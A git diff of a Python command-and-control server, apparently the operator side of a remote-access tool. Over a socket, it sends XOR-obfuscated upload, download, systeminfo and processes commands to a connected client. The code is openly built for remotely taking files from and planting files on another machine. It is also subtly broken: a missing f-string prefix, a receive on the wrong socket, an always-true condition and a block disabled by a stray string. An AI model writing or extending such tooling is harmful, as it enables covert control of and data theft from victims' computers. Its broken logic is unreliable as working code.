@@ -28,6 +28,7 @@ def xor(message):
     return str.encode(newMessage) # return result
 
 while True: 
+    print("Accepting...")
     conn, addr = sock.accept() # Accept incoming connection and get client's address
     print ('Connection from ' + str(addr))
 
@@ -43,29 +44,32 @@ while True:
         elif userInput.lower() == "upload":
             # syntax: upload /path/to/file
             # file will go to client's  current working directory
-            print("Uploading...")
+            print("Sending upload command") # debug
             command = userInput.split(' ')
 
             if len(command) != 2: #check if number args provided is correct
                 print("Incorrect upload syntax, use two arguments.")
                 continue
 
-            userInput = xor(command[0]) #encrpyt user input commmand
+            userInput = xor(command[0].lower()) #encrpyt user input commmand
             conn.sendall(userInput) #send encrypted command to client
 
             sourcePath = command.pop(1) #get src file path from user input
-            fileSize = os.stat(sourcePath).st_size #get file size
-            fileSizeStr = str(fileSize).zfill(10) #file size -> string and pad with zeros
-            print(fileSizeStr)
-            print(f"Filesize of file to upload is: {fileSizeStr}")
-            userInput = xor("{fileSizeStr}") #encrypt filesize with pad
-            conn.sendall(userInput) #send encrypted file to client
+            
+            #fileSize = os.stat(sourcePath).st_size #get file size
+            #fileSizeStr = str(fileSize).zfill(10) #file size -> string and pad with zeros
+            #print(fileSizeStr)
+            #print(f"Filesize of file to upload is: {fileSizeStr}")
+            #userInput = xor("{fileSizeStr}") #encrypt filesize with pad
+            #conn.sendall(userInput) #send encrypted file to client
 
             with open(sourcePath, 'rb') as file: #open src file in binary mode
                 conn.sendall(xor(file.read()))
+                
+            conn.recv(1024) # get confirmation if file was recieved
         
         elif "download" in userInput.lower():
-            # syntax: download /remote/path    o/file    o/download /local/path
+            # syntax: download /remote/path    client/file/path    local/file/path
             # file will go to server's current working directory
             
             command = userInput.split(' ')
@@ -73,10 +77,25 @@ while True:
             if len(command) != 3: #check if number args provided is correct
                 print("Incorrect download syntax, use two arguments.")
                 continue
-                
-            destinationPath = command.pop(1) 
+            
+            userInput = xor(command[0].lower()) #encrpyt user input commmand
+            conn.sendall(userInput) #send encrypted command to client
+            
+            userInput = xor(command[1].lower())
+            conn.sendall(userInput) # send name of file desired for download
+            
+            destPath = command.pop(1)
+            print(f"Writing file to {destPath}\n") 
+            with open(destPath, 'wb') as file:
+                while True:
+                    filedata = sock.recv(1024)
+                    if not filedata:
+                        break
+                    file.write(filedata)
+                print(f"File {destPath} received successfully")
+            '''
             f = open(destinationPath, 'w+b') #open destinaiton file in write and binary mode
-            print("Writing file to {}\n".format(destinationPath)) 
+            
             userInput = ' '.join(command) #join remaining command parts of the user inputs
             userInput = xor(userInput) #encrypt user input
             conn.sendall(userInput) #send encrypted command to client
@@ -109,6 +128,7 @@ while True:
 
             print("File download complete!\n")
             f.close() # close destination file
+            '''
             break
         elif "systeminfo" or "processes" in userInput.lower():
             userInput = xor(userInput)
